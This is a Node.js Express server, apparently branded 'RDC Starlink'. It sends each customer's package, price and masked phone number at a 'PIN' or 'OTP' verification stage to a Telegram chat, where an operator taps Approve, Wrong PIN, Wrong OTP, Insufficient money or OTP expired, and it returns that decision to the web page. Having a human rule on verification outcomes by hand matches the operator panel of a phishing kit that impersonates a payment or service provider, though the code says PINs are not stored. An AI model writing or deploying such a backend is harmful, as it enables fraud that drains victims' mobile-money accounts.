const express = require("express");
const cors = require("cors");
require("dotenv").config();

const app = express();
app.use(cors());
app.use(express.json());

const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

const requests = new Map();
let telegramOffset = 0;
let polling = false;

const ALLOWED = new Set([
  "approved",
  "wrong_pin",
  "wrong_otp",
  "insufficient_money",
  "otp_expired"
]);

function makeId() {
  return `${Date.now()}-${Math.random().toString(36).slice(2, 9)}`;
}

async function tg(method, body = {}) {
  if (!BOT_TOKEN) throw new Error("TELEGRAM_BOT_TOKEN is missing");

  const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(body)
  });

  const data = await r.json();
  if (!r.ok || !data.ok) {
    throw new Error(data.description || "Telegram API request failed");
  }
  return data;
}

function maskPhone(phone) {
  const d = String(phone).replace(/\D/g, "");
  if (d.length < 4) return "****";
  return `${"*".repeat(Math.max(0, d.length - 4))}${d.slice(-4)}`;
}

function keyboardFor(request) {
  if (request.stage === "pin") {
    return {
      inline_keyboard: [
        [
          { text: "Approve", callback_data: `status:approved:${request.id}` },
          { text: "Wrong PIN", callback_data: `status:wrong_pin:${request.id}` }
        ]
      ]
    };
  }

  return {
    inline_keyboard: [
      [
        { text: "Approve", callback_data: `status:approved:${request.id}` },
        { text: "Wrong OTP", callback_data: `status:wrong_otp:${request.id}` }
      ],
      [
        { text: "Insufficient money", callback_data: `status:insufficient_money:${request.id}` },
        { text: "OTP expired", callback_data: `status:otp_expired:${request.id}` }
      ]
    ]
  };
}

async function sendAdminMessage(request) {
  if (!ADMIN_CHAT_ID) throw new Error("TELEGRAM_CHAT_ID is missing");

  const stageText =
    request.stage === "pin"
      ? "Customer is at PIN verification."
      : "Customer is at OTP verification.";

  const text =
    `RDC STARLINK\\n\\n` +
    `Request ID: ${request.id}\\n` +
    `Stage: ${request.stage.toUpperCase()}\\n` +
    `Package: ${request.packageName}\\n` +
    `Validity: ${request.validity}\\n` +
    `Price: ${request.price}\\n` +
    `Phone: ${request.phoneMasked}\\n\\n` +
    `${stageText}`;

  await tg("sendMessage", {
    chat_id: ADMIN_CHAT_ID,
    text,
    reply_markup: keyboardFor(request)
  });
}

app.get("/", (req, res) => {
  res.json({
    status: "online",
    service: "RDC Starlink Telegram backend",
    message: "Backend is running successfully."
  });
});

app.get("/health", (req, res) => {
  res.json({
    status: "ok",
    telegramConfigured: Boolean(BOT_TOKEN && ADMIN_CHAT_ID)
  });
});

/*
  Create a PIN-stage request.
  Sensitive PIN values are intentionally NOT accepted or stored.
*/
app.post("/api/requests", async (req, res) => {
  try {
    const { packageName, validity, price, phone, stage = "pin" } = req.body || {};

    if (!packageName || !validity || price === undefined || !phone) {
      return res.status(400).json({
        error: "packageName, validity, price and phone are required"
      });
    }

    if (stage !== "pin" && stage !== "otp") {
      return res.status(400).json({ error: "Invalid stage" });
    }

    const request = {
      id: makeId(),
      stage,
      packageName: String(packageName),
      validity: String(validity),
      price: String(price),
      phoneMasked: maskPhone(phone),
      status: "pending",
      createdAt: new Date().toISOString()
    };

    requests.set(request.id, request);

    try {
      await sendAdminMessage(request);
    } catch (error) {
      requests.delete(request.id);
      console.error("Telegram send failed:", error.message);
      return res.status(502).json({
        error: "Telegram notification failed"
      });
    }

    res.status(201).json({
      requestId: request.id,
      status: request.status,
      stage: request.stage
    });
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: "Server error" });
  }
});

app.get("/api/requests/:id", (req, res) => {
  const request = requests.get(req.params.id);

  if (!request) {
    return res.status(404).json({ error: "Request not found" });
  }

  res.json({
    requestId: request.id,
    status: request.status,
    stage: request.stage
  });
});

async function handleCallback(callback) {
  const data = String(callback.data || "");
  const parts = data.split(":");

  if (parts.length !== 3 || parts[0] !== "status") return;

  const status = parts[1];
  const requestId = parts[2];

  if (!ALLOWED.has(status)) return;

  if (String(callback.message?.chat?.id || "") !== String(ADMIN_CHAT_ID || "")) {
    await tg("answerCallbackQuery", {
      callback_query_id: callback.id,
      text: "Not authorized."
    });
    return;
  }

  const request = requests.get(requestId);

  if (!request) {
    await tg("answerCallbackQuery", {
      callback_query_id: callback.id,
      text: "Request not found."
    });
    return;
  }

  request.status = status;
  request.updatedAt = new Date().toISOString();

  const labels = {
    approved: "Approved",
    wrong_pin: "Wrong PIN",
    wrong_otp: "Wrong OTP",
    insufficient_money: "Insufficient money",
    otp_expired: "OTP expired"
  };

  await tg("answerCallbackQuery", {
    callback_query_id: callback.id,
    text: labels[status]
  });

  try {
    await tg("editMessageReplyMarkup", {
      chat_id: callback.message.chat.id,
      message_id: callback.message.message_id,
      reply_markup: { inline_keyboard: [] }
    });
  } catch (e) {
    console.error("Could not remove Telegram buttons:", e.message);
  }

  await tg("sendMessage", {
    chat_id: ADMIN_CHAT_ID,
    text:
      `RDC STARLINK\\n` +
      `Request: ${request.id}\\n` +
      `Stage: ${request.stage.toUpperCase()}\\n` +
      `Decision: ${labels[status]}`
  });
}

async function pollTelegram() {
  if (polling || !BOT_TOKEN || !ADMIN_CHAT_ID) return;
  polling = true;

  while (true) {
    try {
      const result = await tg("getUpdates", {
        offset: telegramOffset,
        timeout: 25,
        allowed_updates: ["callback_query"]
      });

      for (const update of result.result || []) {
        telegramOffset = update.update_id + 1;

        if (update.callback_query) {
          try {
            await handleCallback(update.callback_query);
          } catch (error) {
            console.error("Callback handling failed:", error.message);
          }
        }
      }
    } catch (error) {
      console.error("Telegram polling error:", error.message);
      await new Promise(resolve => setTimeout(resolve, 3000));
    }
  }
}

if (!BOT_TOKEN || !ADMIN_CHAT_ID) {
  console.warn("Telegram environment variables are not configured.");
} else {
  pollTelegram();
}

app.listen(PORT, () => {
  console.log(`RDC Starlink backend running on port ${PORT}`);
});
